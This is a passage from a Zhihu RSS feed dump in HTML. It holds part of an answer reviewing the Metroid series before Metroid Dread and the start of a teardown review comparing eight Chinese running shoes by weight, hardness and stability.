融合》是系列中最特殊的一部作品。</p>\n<p>《超级密特罗德》的推出虽然获得了游戏界的一致好评，但区区近200万的销量却让系列陷入了长达8年的沉寂中。1996年，任天堂推出了次时代3D主机<b>Nintendo 64</b>。在这八年空窗期中，任天堂的两大巨头ip——超级马力欧与塞尔达传说纷纷转型3D成功，在64上发布上游戏史上不可或缺的两部巨作——<b>《超级马里奥 64》与《塞尔达传说 时之笛》</b>。遗憾的是，N64的生命周期中没有迎来任何一部密特罗德作品，无论是2D还是3D，玩家们在N64上玩密特罗德的愿望最终还是落空了</p>\n<p>时间来到了2002年，为了给自家的新游戏机扩充游戏阵容，任天堂在2002年同时发行了两部密特罗德作品——一部是NGC上的《<b>密特罗德 究极</b>》，密特罗德的首部3D作品；另一部是GBA上的《<b>密特罗德 融合</b>》，是正统2D密特罗德系列的第四部作品。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d3444de8e71e309f241181095d2cf2ae_720w.jpg?rss\" data-rawwidth=\"282\" data-rawheight=\"400\" data-size=\"normal\" data-caption=\"密特罗德首部3D化作品，本文不详细介绍\" data-watermark=\"watermark\" data-original-src=\"v2-d3444de8e71e309f241181095d2cf2ae\" data-watermark-src=\"v2-6ae3c23fa15f620bd7a6d7825fdbe90f\" data-private-watermark-src=\"v2-15c8f0ee069c2e686bde466231aedf0b\"></p>\n<p>彼时由于《密特罗德 究极》的首次3D化再一次像红绿帽一样震撼了整个游戏界，玩家纷纷陶醉于《究极》那如同《超级密特罗德》一样奇诡而神秘的幻想世界中。</p>\n<p>作为《超密》的正统续作，同期发售的《密特罗德 融合》却遭到了冷落，很多老玩家<b>吐槽这次的探索流程过于线性，人工智能Adam所给的指引太多</b>，这使得这部正统2D续作的评价普遍不如《超级密特罗德》。</p>\n<p>然而，我们回过头看，会发现一个奇怪的现象：一开始被冷嘲热讽的《密特罗德 融合》，口碑竟然逐年稳步上升，获得了越来越多玩家的拥趸，甚至成为了某些粉丝心目中超越《超密》的神作。</p>\n<p>这究竟是怎么回事？</p>\n<p>我仔细游玩后发现，原因应该在于《<b>融合》所营造的独特的恐怖感与不安感，以及在这种氛围下对环境叙事手法的忠实。</b></p>\n<p><b>恐惧本身往往不是设计师想达到的最终目标，他们想要的其实是恐惧对气氛与节奏的调剂</b>。</p>\n<p>出于对恐惧本身的恐惧，玩家被迫提起精神，全神贯注地投入到游戏中去。一旦战胜了心中的恐惧，成就感也就会油然而生，这种成就感不同于探索，这是一种战胜自我的成就感。</p>\n<p>《密特罗德 融合》的主题就在于“<b>融合</b>”，这种<b>非自然且猎奇</b>的现象。故事讲述了与密特罗德融合的萨姆斯来到了一个融合了各种自然生态的空间站上，同时也遇到了融合了各种生物形态的新型生物。本作新出现的外来生命体X也具有与其他生物融合寄生的能力，甚至还能寄生在萨姆斯身上，诞生了全系列最恐怖的BOSS——<b>SAX</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a76ce3578a793a20435ac35ecbe180b7_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"系列新登场的X生命体\" data-watermark=\"watermark\" data-original-src=\"v2-a76ce3578a793a20435ac35ecbe180b7\" data-watermark-src=\"v2-5056947f5a04379a6141e42016d06584\" data-private-watermark-src=\"v2-5cf8b06092c36313c9804a0be2d4bf7d\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9a7f3bf2673408370eb19a6281ae512b_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"X的萨姆斯复制体——SAX\" data-watermark=\"watermark\" data-original-src=\"v2-9a7f3bf2673408370eb19a6281ae512b\" data-watermark-src=\"v2-a5a6536c2103d48898cb29550df2d038\" data-private-watermark-src=\"v2-b4c6f8e53582d765ffdd4db6bdfde1db\"></p>\n<p>各种不自然现象的集合使游戏气氛的恐怖程度在超密的基础上更进一步，<b>同时本作引入了类似生化危机3的逃脱机制——玩家需要躲避暂时无法战胜的SAX的攻击</b>，这种无法反抗的巨大压迫感极度地增长了玩家的不安情绪，每到一个地方都会胆战心惊，生怕SAX突然蹦出来把子弹糊你脸上。</p>\n<p>同时，本作的BOSS设计也“颇具新意”，不同于超密用体型巨大的BOSS来体现压迫感，融合更擅长用猎奇的设计来体现恐惧感。比如BOSS噩梦采用层层褪皮，控制重力的奇特设计征服了每个人的眼球；比如BOSS电子蜘蛛采用悬挂式人体描边打法，为玩家贡献了一次“躲子弹——射子弹”的迂回体验</p>\n<p><img src=\"https://pic4.zhimg.com/v2-39011b40999959fe29415b9c8894c0c4_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"个人认为是系列最好的BOSS设计\" data-watermark=\"watermark\" data-original-src=\"v2-39011b40999959fe29415b9c8894c0c4\" data-watermark-src=\"v2-9482d81be74931ede54cf1cb6b85d560\" data-private-watermark-src=\"v2-86de16f5913ca3ebec6779b0f86943c9\"></p>\n<p>相比于前作重旋律的BGM设计，这作的音乐更偏向于没有什么旋律的环境音效，这些音效失去了抓住玩家耳朵的力量，却揪住了玩家的心，不安的环境配上不协调的音效，后面还有人在追杀，还有什么事比这更恐怖吗？</p>\n<p>环境叙事也是本作的一大亮点，空中飞过的不明黑影，地面上原来活蹦乱跳的甲壳虫突然只剩下的狰狞的空壳，一条普通的活鱼接触到X后突然变成了一条巨大且丑陋的怪鱼……融合采用环境的变化作为它的叙述手段，比恐怖的文字更加令人不寒而栗。</p>\n<p><br></p>\n<p><b>回到这次的新作上，副标题DREAD说明了这次的主题——生存与恐惧，同时作为融合之后的正统续作，肯定也会继承相关的音乐设计与环境叙事，使游戏的各个方面都能够体现生存恐惧的主题，</b>所以在玩我的预期里，m5也应该有融合的恐惧感，而且势必也会更近一步。</p>\n<p>根据已知的相关信息，生存恐惧的主题大体会体现在三个方面：<b>一是对emmi的恐惧，</b>emmi继承了融合中SAX的设定，而且会更加灵活，更加智能；<b>二是对鸟人的恐惧，</b>鸟人族一定会是这次完结篇的重要角色，第二支预告的鸟人为什么要攻击萨姆斯，鸟人族究竟有什么不可战胜的秘密武器；<b>三是对Metroid与X的恐惧（猜测)，</b>X生物已经被确定存在与行星ZDR上，那ZDR上是否也会有残余的Metroid？生存恐惧作为Metroid故事的阶段完结，Metroid与X又会在故事里起到什么作用，他们还会是萨姆斯的敌人吗？</p>\n<hr>\n<p><img src=\"https://pic2.zhimg.com/v2-aaaa303e2b29b0f55ad15413bf41c106_720w.jpg?rss\" data-rawwidth=\"1132\" data-rawheight=\"601\" data-size=\"normal\" data-caption=\"左：《萨姆斯的回归》gameboy原作封面                              右：《萨姆斯归来》3DS重制版封面\" data-watermark=\"watermark\" data-original-src=\"v2-aaaa303e2b29b0f55ad15413bf41c106\" data-watermark-src=\"v2-0bc73b54f5c070a5240a164b8604a542\" data-private-watermark-src=\"v2-270dab49ecb8afa20620dccc63af7a1c\"></p>\n<h2>《萨姆斯归来》的现代化处理</h2>\n<p>2017年6月14日的任天堂E3展前发布会上，当人们还沉浸在《密特罗德 究极4》的LOGO饼正式发布的喜悦中时，还没有人能想到这款2017年中旬就公布的游戏直到2021年还连个实机画面都没有（法克！！！）与此同时，展会上还发布了一款3DS游戏——《密特罗德 萨姆斯归来》（简称萨归），本作是1991年发行的《密特罗德2 萨姆斯的回归》的完全重制版，首次采用3D背景2D玩法的设计，同时本作也是自2004年的《密特罗德 零点任务》后暌违13年的2D系列作品（惨淡的密特罗德系列），也得到了很多新老玩家的期待。</p>\n<p>《萨归》获得了游戏界的普遍好评：Metacritic 85/10  IGN 8.5/10  GI 9.75/10</p>\n<p>同时也是2017TGA的“最佳掌机游戏”，第21届D.I.C.E.游戏大奖“年度掌上游戏奖”</p>\n<p>即使如此，作为3DS末期最后的大作，区区几十万套只能说“基本符合预期”。同时，由于本作是1991年《密特罗德2》的完全重制版，也继承了原作因掌机限制而被迫线性设计的关卡地图、略显重复的BOSS与任务设计，因此在老玩家的心目中只能说“中规中矩”，甚至还不如1年前由同人粉丝制作的二代像素重制版《Another Metriod 2 remake》(《AM2R》）</p>\n<p>但是，《萨姆斯归来》的意义绝不仅仅停留在一部优秀的掌机旧作的重制版上，在原作的基础上，任天堂与这次的合作伙伴MercurySteam还进行了大量现代化的处理：首次采用3D建模背景，BOSS战加入3D过场，360度的全角度瞄准，引入了近战反击与AEION能量槽，并通过AEION能量槽机制加入了“导弹雨”“时间减缓”等辅助机制。更重要的是，这次的地图系统加入了标记等现代化功能，玩家可以在地图上注明某些特殊的房间，从而避免出现《超密》中想回去却找不到地方的尴尬。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-76f499d1cd3e818e822b3b23e0223325_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"用导弹雨胖揍利德雷\" data-watermark=\"watermark\" data-original-src=\"v2-76f499d1cd3e818e822b3b23e0223325\" data-watermark-src=\"v2-e940c02a5ea09dfb555090939cea688b\" data-private-watermark-src=\"v2-653d9c0beaf11f7f83eddef5e6a902c3\"></p>\n<p><b>现在看来，《萨姆斯归来》的现代化处理仅仅是个开始，《生存恐惧》无疑会更近一步。</b></p>\n<p>根据官网披露的消息，本作萨姆斯的动作槽将在《萨归》的基础上得到大幅扩充：</p>\n<ol>\n<li>原先只能在原地进行的近战反击，现在移动状态也可以</li>\n<li>加入“滑铲”的全新操作，很多狭窄的区域可以不用变球直接通过</li>\n<li>滑铲时遇到只能变球通过的细道会自动变球通过</li>\n<li>系列的“高跳”能力现在被可控性更高的“二级跳”取代</li>\n<li>一键变球，360度瞄准与扫描机制得到了保留</li>\n<li>增加“十字球炸”与prime系列的多重导弹</li>\n<li>系列经典能力悉数回归，包括加速鞋与“凤凰之舞”</li>\n<li>AEION能力更改，加入全新的“闪光冲刺”“幻影斗篷”</li>\n<li>多种技能现可以组合运用，比如加速鞋可以与滑铲、踢墙跳连用，达到行云流水的效果</li>\n</ol>\n<p><img src=\"https://pic1.zhimg.com/v2-f074bd7d5df7bc3bfabdfb5286a186ae_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"PRIME系列的多发瞄准导弹\" data-watermark=\"watermark\" data-original-src=\"v2-f074bd7d5df7bc3bfabdfb5286a186ae\" data-watermark-src=\"v2-4f8ea6c4683acc44330edb7e512df158\" data-private-watermark-src=\"v2-1d0e1af50a0bf06fe06c9d83666c2b41\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-76447afdc5508809df1afd31b4b579f0_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"可以移动中进行的“近战反击”\" data-watermark=\"watermark\" data-original-src=\"v2-76447afdc5508809df1afd31b4b579f0\" data-watermark-src=\"v2-546d171986cc938c719a733b43789bba\" data-private-watermark-src=\"v2-748093d0da897fa90887912690e38e75\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-06212d7a3044fe8b35fcd08e4730ce8f_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"全新的AEION能力“闪光冲刺”，可以消耗全部AEION能量实现1-3次水平瞬移\" data-watermark=\"watermark\" data-original-src=\"v2-06212d7a3044fe8b35fcd08e4730ce8f\" data-watermark-src=\"v2-bee0d5357c513e4278ff5a5ea7ddf450\" data-private-watermark-src=\"v2-72367a61171ed39232a637fe6ad2e38a\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e368f85839f256f95a47b336e84b87d4_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"全新的AEION能力“幻影斗篷”，可以暂时躲避EMMI的追捕\" data-watermark=\"watermark\" data-original-src=\"v2-e368f85839f256f95a47b336e84b87d4\" data-watermark-src=\"v2-d7a363ea40105d9359449d4ad4951e5f\" data-private-watermark-src=\"v2-9153ee5e4f4278de0440a1d87193d2e4\"></p>\n<p>下面是一段运用多种能力组合、极其行云流水的片段：</p>\n<a href=\"https://www.zhihu.com/video/1428036622697197568\"></a><p><br></p>\n<p>同时，生存恐惧依然采用<b>3D建模2D玩法的画面设计</b>，不过由于这次发售在NS，画面的色彩丰富度，建模精细度，光影特效全部大幅进化，密特罗德也终于迎来了高清时代。</p>\n<p><b>地图系统的功能也更加现代化</b>，标注等功能变得更加实用；<b>新加的任务说明系统</b>可以有效防止出现隔段时间打开游戏出现的“我是谁？““我在哪？”“我要干什么的？”的哲学三问，暌违19年的正统续作也总算没有落后时代。</p>\n<hr>\n<p>根据已知的消息，这次的M5理应具有媲美《融合》的恐惧感与《萨姆斯归来》的动作感，不然怎么对得起你这次DREAD的副标题与空前强化的动作槽。</p>\n<p>我现在唯一担心的其实是M5的探索感，虽然官方报告中的“可以乱序获得能力”就像一颗及时的定心丸，但也的的确确拉高了我的期待。《超级密特罗德》之所以连续二十几年屹立不倒，就在于它超越时光的关卡设计与探索感。<b>这些东西不是现代的设计师们靠灵光一现就能做到的，这需要的是几十年沉淀积累的关卡设计理念，需要的是用时间来反复打磨的“匠人精神”，正是这些难能可贵的品质与才华铸就了密特罗德系列，铸就了Metroidvania这一全新的游戏类型。</b></p>\n<p><b>希望这次任天堂与水银蒸汽还能带给我们一部如同《塞尔达传说 旷野之息》与《超级马力欧奥德赛》一样伟大的作品！</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/say-66-3?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Scramble</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/490296535/answer/2151280565?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">14 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/431009539?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果任天堂的SWITCH搭载苹果M1芯片会怎样？</a><br><a href=\"http://www.zhihu.com/question/390928263?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">据说SWITCH游戏卡特别苦，怎样在不舔的情况下满足好奇心？</a><br>\n","link":"http://www.zhihu.com/question/490296535/answer/2151280565?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国产哪些跑鞋值得入手？","date":"2021-10-08 05:06:33","description":"\n<p>作为跑鞋博主，好久没有写过这么酣畅淋漓的回答了，这次借助 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/9f4fb22e0686450a11c6d5dc122e4888\" data-hash=\"9f4fb22e0686450a11c6d5dc122e4888\" data-hovercard=\"p$b$9f4fb22e0686450a11c6d5dc122e4888\">@知乎生活</a> 的翻牌众测活动，从市面上选取了8双畅销的国产慢跑鞋，对其进行了<b>路跑测试</b>和<b>拆解测评</b>。</p>\n<p><b>这是写了数十万收藏的跑鞋相关回答以来最硬核的一篇回答，让我们看看这8双国产跑鞋到底哪些值得入手？</b></p>\n<p>在拆解前还是非常心疼的，也在想到底<b>拆解测评的意义</b>有多大。可是随着一双双跑鞋被拆解露出内部结构，<b>看到了很多商家不想让我们知道的东西，以及很多惊喜的设计</b>，更加坚定了要拆解下去的信心，这就是拆解测评的意义所在吧：</p>\n<p><b>希望能为普通跑步爱好者提供更全面的选购参考，而不只是商家想让你知道的片面信息。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7b960738efde06e605951811e8fb1898_720w.jpg?rss\" data-caption=\"跑鞋拆解现场\" data-size=\"normal\" data-rawwidth=\"804\" data-rawheight=\"1073\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>本次关于跑鞋的测评不仅有常规的<b>参数对比和路跑测试</b>，还额外加入了2个全新的测评方法：</p>\n<p><b>拆解测评和左右脚穿不同型号跑鞋路跑测试</b></p>\n<h2><b>1. 拆解测评-共拆解了8双国产跑鞋</b></h2>\n<p><b>拆解后</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-bd21dbaa09cdda96d902cea97605c0a4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"829\" data-rawheight=\"622\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>拆解前</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a93b769f3b766c9f7b97fd45d156ed5c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"862\" data-rawheight=\"582\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>2. 左右脚穿不同跑鞋路跑测试</b></h2>\n<p>该测试具有一定的风险性，请勿模仿</p>\n<p><b>由于不同型号的跑鞋缓震不同，中底厚度不同，会导致左右脚受力不同，触地时间不同，长时间重复性的跑步可能会导致受伤，所以该测试请勿模仿。</b></p>\n<p><b>路跑测试：</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5fa7ccd5c8d5b8a2f6ec17ce7dce76ec_720w.jpg?rss\" data-caption=\"361国际线Spire-R和必迈千里\" data-size=\"normal\" data-rawwidth=\"880\" data-rawheight=\"880\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-27b581fd7879c4db841e87e4acc690a1_720w.jpg?rss\" data-caption=\"多威反重力和特步动力巢\" data-size=\"normal\" data-rawwidth=\"855\" data-rawheight=\"855\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>在</b>测评之前，先把8双跑鞋的重量和邵氏硬度计测量的重量参数列出来，大家根据这个量化的对比数据，先猜一猜：</p>\n<p><b>哪款跑鞋踩屎感最强？</b></p>\n<p><b>哪款跑鞋适合跑长距离？</b></p>\n<p><b>测评结束后看看和你的猜测是否一致</b></p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<td></td>\n<td>匹克态级3.0PRO</td>\n<td>鸿星尔克Flex 3.0</td>\n<td>必迈千里</td>\n<td>361国际线Spire-R</td>\n<td>李宁越影</td>\n<td>安踏创1.5</td>\n<td>多威反重力</td>\n<td>特步动力巢</td>\n</tr>\n<tr>\n<td>重量（g）</td>\n<td>307g</td>\n<td>275g</td>\n<td>308g</td>\n<td>311g</td>\n<td>309g</td>\n<td>350g</td>\n<td>398g</td>\n<td>393g</td>\n</tr>\n<tr>\n<td>邵氏硬度</td>\n<td>39C</td>\n<td>40C</td>\n<td>55C</td>\n<td>46C/58C</td>\n<td>45C</td>\n<td>45C</td>\n<td>45C/58C</td>\n<td>42C</td>\n</tr>\n</tbody></table>\n<p><b>称量仪称重：</b></p>\n<b></b><p><img src=\"https://pic1.zhimg.com/v2-b0f30441e5bcd8d9f407123e7ce7f8b9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"995\" data-rawheight=\"746\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>邵氏硬度计测量硬度：</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-97a78213b98ddaf062c9f61ff9651d7c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"826\" data-rawheight=\"619\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在对于跑鞋定位及路跑测试后将8双跑鞋分成了3类。下面的测评将按照休闲跑鞋，长距离慢跑鞋以及大体重跑鞋三类来进行一个横向的对比测评。</p>\n<p>对比的维度将从：</p>\n<p><b>缓震回弹性能；稳定支撑性能；重量；</b>透气，耐磨，包裹，颜值等方面展开。</p>\n<p>其中重点测评对保护性最重要的<b>缓震回弹表现和稳定支撑表现</b>。</p>\n<h2>一．休闲跑鞋</h2>\n<p>休闲跑鞋主要是用于平时走路穿，特点是脚感特别舒适（俗称的踩屎感比较强），跑鞋中底比较软，不适合长距离跑步，再强调一遍，<b>踩屎感强的鞋真的不适合跑步</b></p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<td></td>\n<td>匹克态级3.0PRO</td>\n<td>鸿星尔克Flex 3.0</td>\n</tr>\n<tr>\n<td>重量（g）</td>\n<td>307g</td>\n<td>275g</td>\n</tr>\n<tr>\n<td>邵氏硬度</td>\n<td>39C</td>\n<td>40C</td>\n</tr>\n</tbody></table>\n<h3>1. 缓震回弹表现</h3>\n<p><b>鸿星尔克flex 3.0中底压缩形变gif图：</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3515a2c056443f45edfe04668eb1ae45_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"403\" data-watermark=\"watermark\" data-original-src=\"v2-3515a2c056443f45edfe04668eb1ae45\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>匹克态级3.0 PRO</b>中底压缩gif图：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5a55b410d25b17ef8af35077bc18ea94_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"407\" data-watermark=\"watermark\" data-original-src=\"v2-5a55b410d25b17ef8af35077bc18ea94\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>鸿星尔克flex 3.0和匹克态级3.0PRO硬度值几乎在同一水平，如果用一个字形容，<b>那就是-软，</b>满满的踩屎感。</p>\n<p>每一步都能感受到中底充沛的压缩形变，这也是休闲跑鞋所需要的，好像踩在棉花里一样的感觉。</p>\n<p>这么大的压缩变形，实在是太讨好脚感了，可是没有像Pebax那样的回弹的话，只会越跑越累，所以说他们的定位是休闲跑鞋。</p>\n<h3>2. 稳定支撑表现</h3>\n<p>鸿星尔克Flex 3.0</p>\n<p>鸿星尔克京东官方旗舰店对于该款跑鞋的描述是：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0f051caa812323a48273f7d01eb7f4bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"917\" data-rawheight=\"194\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>实际拆解内部结构：</b></p>\n<p>实际拆解出来的碳板和官方介绍的碳板有非常大的差异。</p>\n<p><b>官方介绍的碳板几乎从后跟延伸到前掌</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e18001f6bf0a964b5db48b297df6b099_720w.jpg?rss\" data-caption=\"店铺网页跑鞋内部结构爆炸图\" data-size=\"normal\" data-rawwidth=\"998\" data-rawheight=\"438\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>实际拆解出来的碳板仅仅覆盖消费者能看到的裸露部分，看不到的部分几乎全是空的。</b></p>\n<p><b>裸露的碳板：</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0cb3080d0853697e233187a2f3b3e956_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"956\" data-rawheight=\"646\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>拆解的碳板，覆盖部分几乎无碳板</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2a524f3febc43f8223ce1486d3c1da52_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"928\" data-rawheight=\"626\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>再看整个跑鞋的结构：</p>\n<p>前掌以及后跟都是翘起的弧度设计，中足处是一般竞速鞋才有的收腰设计，导致整个鞋和地面的接触面积非常小，再配合上几乎没有抗扭转作用的极小的碳板。</p>\n<p>而且跑鞋的中底又太软，每一次落地的形变都非常大。</p>\n<p>造成的结果就是在跑步过程中落地非常不稳，需要脚踝额外发力来维持落地的稳定，因此增加了受伤的风险，目前跑了2次，跑到5km后脚踝会有酸痛的症状。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-06aa1d30c9a8996ccbe0b4d5781aace4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"914\" data-rawheight=\"685\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>这双鞋真的不太适合跑步，因此把它列在了休闲跑鞋的类别里。</b></p>\n<p><b>希望厂家把精力用在提升产品力上，不要再拿碳板做营销了，这么小一个碳板（故意裸露让消费者看见）用在这里除了吸引眼球还能有什么实际用处呢？</b></p>\n<ul><li><b>匹克态级3.0 PRO</b></li></ul>\n<p>态级的定位是休闲跑鞋，39C的硬度，同样是满满的踩屎感，态级从最初的1.0被跑友诟病太软，稳定性太差。后来升级到稳定性提升的2.0，再到如今的3.0，产品迭代非常之快，3.0PRO相比上一代的2.0PRO做了大幅度瘦身，44码单只重量307g。</p>\n<p>虽然同样软，但态级3.0PRO的稳定支撑性由于鞋底的抗扭转片刚度非常高，并且整个鞋底落地时大面积接触地面，所以稳定性非常好</p>\n<p><b>鞋底的X形抗扭转片：</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4e920aae43b34cbb22bb1c105d98abe0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"783\" data-rawheight=\"588\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>抗扭片刚度很强，拆解时非常用力才能掰断：</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dd0bcc8d9e23a16e61c5b465792c928b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"838\" data-rawheight=\"629\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这款鞋在测试时跑5km非常轻松，加上非常高的颜值，因此休闲跑以及平时街穿都非常合适</p>\n<p><img src=\"https://pic2.zhimg.com/v2-82f84d1d782ab188fef280249402b49e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"936\" data-rawheight=\"702\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3><b>休闲跑鞋总结：</b></h3>\n<p>对于休闲跑鞋来说，脚感是第一位的，首要强调踩屎感，要求跑鞋要软。在此基础上要有不错的稳定支撑性能以能够满足基础的短距离跑步需求，在此基础上轻量化，透气性，颜值等也是不错的加分项。</p>\n<p>鸿星尔克Flex 3.0虽然有着275g的轻量化表现，邵氏硬度40C的非常软的脚感，但是其仅起装饰作用的稳定小碳板使得跑鞋的稳定支撑性能非常差，不适合跑步时穿，不推荐作为休闲跑鞋；</p>\n<p>匹克态级3.0PRO 44码307g的重量，邵氏硬度39C的踩屎感脚感，并且具有非常不错的稳定支撑性，非常适合街穿以及短距离跑步，是一双非常不错的休闲跑鞋；</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429789408412856320\"></a><h2>二. 长距离慢跑鞋</h2>\n<p>必迈千里，361国际线Spire-R以及李宁越影的参数如下：</p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<td></td>\n<td>必迈千里</td>\n<td>361国际线Spire-R</td>\n<td>李宁越影</td>\n</tr>\n<tr>\n<td>重量（g）</td>\n<td>308g</td>\n<td>311g</td>\n<td>309g</td>\n</tr>\n<tr>\n<td>邵氏硬度</td>\n<td>55C</td>\n<td>46C/58C</td>\n<td>45C</td>\n</tr>\n</tbody></table>\n<h3>1. 缓震回弹表现</h3>\n<p>必迈中底变形gif图，几乎无形变</p>\n<p><img src=\"https://pic4.zhimg.com/v2-29235a4f7e6920f97258bda430fe3d2e_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"413\" data-watermark=\"watermark\" data-original-src=\"v2-29235a4f7e6920f97258bda430fe3d2e\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>361国际线Spire-R中底形变gif图</p>\n<p><img src=\"https://pic2.zhimg.com/v2-567553bb1b9bf1961d7ac900f7abef3c_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"599\" data-rawheight=\"384\" data-watermark=\"watermark\" data-original-src=\"v2-567553bb1b9bf1961d7ac900f7abef3c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>两种密度组成的中底-紫色是361自家的QUIKFOAM中底科技，白色是相对较硬的EVA</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7ee24abc50bc92b26b564c0414a5ab99_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"810\" data-rawheight=\"607\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>李宁越影中底形变gif图，有较大形变</p>\n<p><img src=\"https://pic1.zhimg.com/v2-84c8166382be664644fc05b024dca723_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"599\" data-rawheight=\"392\" data-watermark=\"watermark\" 